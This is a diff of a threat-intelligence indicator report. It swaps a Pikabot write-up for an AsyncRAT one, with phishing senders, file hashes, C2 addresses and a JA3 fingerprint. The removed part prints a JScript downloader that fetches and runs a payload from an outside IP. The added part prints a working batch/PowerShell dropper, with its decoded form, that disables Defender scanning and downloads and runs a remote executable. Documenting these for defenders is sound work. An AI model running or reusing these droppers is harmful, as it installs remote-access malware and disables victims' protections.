@@ -1,132 +1,64 @@
-THREAT IDENTIFICATION: TA577 / PIKABOT
+THREAT IDENTIFICATION: ASYNCRAT
 
 SUBJECTS OBSERVED
-All subjects were from previously stolen email threads.
+TAX REFUND 2024
 
 SENDERS OBSERVED
-mhermann@functionsandcatering.com
-pdyrsu@kayclaudy.ht
-zconroy@poupaqui.pt
+whiteshrill@puabook.com
 
 INFECTION FLOW
-eml -> attached .zip -> .xlsx -> .js -> .dll
+eml -> pdf -> url (GitHub) -> zip -> bat -> ps -> ps -> exe
 
-EMAIL BODY ADDITION
-Good day,
-I forwarded a document to you yesterday. Were it arrive you?
+PDF FILE HASH
+Document.pdf
+ce5c413a4b8ba102978f796fd14886d2
 
-ATTACHED ZIP FILE HASH
-ILLUMDY.zip
-ec608a648c66a3574d282f818a5105a2
+ZIP FILE DOWNLOAD URLS
+https://github.com/thecoolest63/frms/raw/main/Doc_Unlock.zip
+https://raw.githubusercontent.com/thecoolest63/frms/main/Doc_Unlock.zip
 
-XLSX FILE HASH
-ILLUMDY.xlsx
-39c90b991a0f36ff8b84e55886ca08d4
+ZIP FILE HASH
+Doc_Unlock.zip
+4809b98c192f6af203fe836b321b8401
 
-XLSX FILE METADATA
-Author: admin
-Last Modified By: admin
+BAT FILE HASH
+Doc_Unlock.bat
+814011e11cc643c991d3e076813575a0
 
-ADDITIONAL FILE HASH
-c
-17f3eddc10916861d1a2d7e961eb6561
+BAT FILE CONTENTS
+@ECHO OFF
+powershell.exe -NoLogo -NoProfile -Noninteractive -WindowStyle hidden -ExecutionPolicy bypass while($true){try{Start-Process "cmd.exe" -Verb runas -ArgumentList "/c", 'powershell.exe -NoLogo -NoProfile -Noninteractive -WindowStyle hidden -ExecutionPolicy bypass -EncodedCommand QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAQwA6AFwAIgA7ACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACIAQwA6AFwAVQBzAGUAcgBzAFwAQwBZAEIAMwBSACAAVwA0AFIAUgBJAE8AUgBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnACIAOwAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADMAOwAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AdABoAGUAYwBvAG8AbABlAHMAdAA2ADMALwBmAHIAbQBzAC8AcgBhAHcALwBtAGEAaQBuAC8AQwBsAGkAZQBuAHQAXwA0ADUAMAAuAGUAeABlACcALAAgACIAQwA6AFwAVQBzAGUAcgBzAFwATABPAFYARQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAdwBpAG4AcwBlAHIAdgBlAHIAZQAuAGUAeABlACIAKQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAQwA6AFwAVQBzAGUAcgBzAFwATABPAFYARQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAdwBpAG4AcwBlAHIAdgBlAHIAZQAuAGUAeABlACIA';exit}catch{}}
 
-JAVASCRIPT FILE DOWNLOAD URL
-file:///\\85.195.115.20\share\1.js
+DECODED BASE64 BLOB
+Add-MpPreference -ExclusionPath "C:\"; Add-MpPreference -ExclusionPath "C:\Users\CYB3R W4RRIOR\AppData\Roaming"; Start-Sleep -Seconds 3; (New-Object System.Net.WebClient).DownloadFile('https://github.com/thecoolest63/frms/raw/main/Client_450.exe', "C:\Users\LOVE\AppData\Local\Temp\winservere.exe"); Start-Process "C:\Users\LOVE\AppData\Local\Temp\winservere.exe"
 
-JAVASCRIPT FILE DOWNLOAD COMMAND
-"C:\Windows\System32\WScript.exe" "\\85.195.115.20\share\1.js" 
-
-JAVASCRIPT CONTENTS (EXTRACTED FOM PCAP)
-/*
-var S5 = new ActiveXObject("msxml2.xmlhttp"), hp = new ActiveXObject("adodb.stream");
-
-S5.open("GET", "http://77.245.76.113/1s6iL/BtCxD", false);
-S5.send();
-
-if(S5.status === 200)
-{
-	hp.type = 1;
-	hp.open();
-	hp.write(S5.responsebody);
-	hp.savetofile("SH.jpg", 2);
-	hp.close();
-}
-*/
-
-/*
-var S9 = new ActiveXObject("wscript.shell");
-*/
-
-/*
-S9.exec("regsvr32 SH.jpg");
-*/
-
-function YQ(k0)
-{
-	var Qr = new ActiveXObject("scripting.filesystemobject");
-	var f1 = Qr.opentextfile(WScript.ScriptFullName, 1);
-	return(f1.readall());
-}
-var aF = /\/\*([\s\S]*?)\*\//g;
-var B2;
-
-do
-{
-	B2 = aF.exec(YQ());
-	if(B2)
-	{
-			eval(B2[1]);
-	}
-}
-while(B2);
-WScript.quit();
+GITHUB REPOSITORY URL
+https://github.com/thecoolest63/frms
 
 PAYLOAD DOWNLOAD URL
-http://77.245.76.113/1s6iL/BtCxD
+https://github.com/thecoolest63/frms/raw/main/Client_450.exe
+
+CONVERT SCRIPT COMMAND (Just swap the filenames)
+https://github.com/thecoolest63/frms/blob/main/Client_450.exe?raw=true
 
 PAYLOAD FILE HASH
-BtCxD
-9077167ffc15a50f701533f177562c1e
+Client_450.exe
+11d8160059e1b3a8aba87995ce384525
 
-UNPACKED PAYLOAD FILE HASH
-2eb0000.ctfmon.exe
-874b9805a469517c1ff472f44b0fe5c8
+ASYNCRAT C2
+192.177.98.104:1337
 
-LIKELY C2s
-https://103.82.243.5:13785/
-https://108.61.78.17:13783/
-https://131.153.231.178:2221/
-https://155.138.147.62:2223/
-https://172.232.162.97:13783/
-https://172.232.189.10:1194/
-https://172.232.189.219:2224/
-https://37.60.242.85:9785/
-https://45.76.251.190:5631/
-https://86.38.225.105:13721/
-https://86.38.225.106:2221/
-https://86.38.225.109:13724/
-https://95.179.135.3:2225/
+OBSERVED MUTEX
+Mutant, \Sessions\1\BaseNamedObjects\Cyb3r_R4tMutex_Cyb3rw4rrior, 0x39c
 
-URLS EXTRACTED FROM MEMORY
-https://103.82.243.5:13785/
-https://103.82.243.5:13785/api/admin.usergroups.addChannels
-https://108.61.78.17:13783/
-https://108.61.78.17:13783/api/admin.conversations.ekm.listOriginalConnectedChannelInfo
-https://108.61.78.17:13783/api/apps.permissions.scopes.list
-https://131.153.231.178:2221/api/admin.teams.admins.list
-https://155.138.147.62:2223/api/admin.teams.admins.list
-https://172.232.162.97:13783/api/admin.apps.restricted.list
-https://172.232.162.97:13783/api/api.test
-https://172.232.189.10:1194/
-https://172.232.189.10:1194/api/admin.inviteRequests.denied.list
-https://172.232.189.219:2224/api/apps.permissions.users.list
-https://37.60.242.85:9785/api/admin.conversations.restrictAccess.addGroup
-https://45.76.251.190:5631/api/admin.inviteRequests.list
-https://86.38.225.105:13721/
-https://86.38.225.105:13721/api/admin.teams.settings.setDiscoverability
-https://86.38.225.105:13721/api/apps.permissions.users.list
-https://86.38.225.106:2221/api/admin.conversations.ekm.listOriginalConnectedChannelInfo
-https://86.38.225.109:13724/api/admin.inviteRequests.deny
-https://95.179.135.3:2225/api/admin.teams.settings.setDiscoverability
+JA3 FINGERPRINT
+fc54e0d16d9764783542f0146a98b300
+
+REFERENCES
+https://sslbl.abuse.ch/ja3-fingerprints/fc54e0d16d9764783542f0146a98b300/
+
+
+
+
+
 
